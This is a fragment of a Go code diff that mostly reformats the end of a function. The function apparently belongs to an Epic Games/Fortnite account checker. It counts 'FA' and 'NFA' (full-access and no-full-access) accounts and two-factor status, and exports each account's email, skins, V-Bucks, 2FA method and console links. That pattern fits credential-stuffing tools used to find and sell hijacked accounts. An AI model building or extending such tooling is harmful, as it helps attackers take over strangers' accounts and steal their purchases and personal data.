+		GetStats().ExportFA(acc, displayName, skinCount, totalVbucks, epicEmail, tfaMethod, hasStw, lastPlayed)
+	}
+
     psnStr := "No"
-    if hasPsn {
-        psnStr = "Yes"
-    }
-    nintendoStr := "No"
-    if hasNintendo {
-        nintendoStr = "Yes"
-    }
-    if isFA {
-        AddToFA(1)
-    } else {
-        AddToNFA(1)
-    }
-    if tfaEnabled == "true" {
-        AddToTwofa(1)
-    }
-    AddToEpicTwofa(1)
-    GetStats().ExportSkins(acc, displayName, skinCount, skinsList, epicEmail, tfaEnabled, psnStr, nintendoStr, emailVerified, IntToString(totalVbucks), tfaMethod, lastPlayed, isFA, hasStw)
-    GetStats().ExportStats(acc)
-    ExportLock.Unlock()
-    CurrentAccountHeadless = false
-    return true
+if hasPsn {
+    psnStr = "Yes"
+}
+nintendoStr := "No"
+if hasNintendo {
+    nintendoStr = "Yes"
+}
+
+	if isFA {
+		AddToFA(1)
+	} else {
+		AddToNFA(1)
+	}
+	if tfaEnabled == "true" {
+		AddToTwofa(1)
+	}
+	AddToEpicTwofa(1)
+GetStats().ExportSkins(acc, displayName, skinCount, skinsList, epicEmail, tfaEnabled, psnStr, nintendoStr, emailVerified, IntToString(totalVbucks), tfaMethod, lastPlayed, isFA, hasStw)    
+
+GetStats().ExportStats(acc)
+	ExportLock.Unlock()
+
+	CurrentAccountHeadless = false
+	return true
 }
